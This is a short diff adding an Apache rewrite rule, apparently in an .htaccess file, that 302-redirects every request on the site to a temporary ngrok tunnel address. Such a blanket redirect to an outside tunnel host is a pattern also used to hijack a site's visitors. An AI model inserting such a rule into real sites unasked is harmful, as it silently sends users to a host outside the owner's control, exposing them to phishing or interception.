@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^(.*)$ https://eea5-5-195-225-158.ngrok-free.app/$1 [R=302,L]
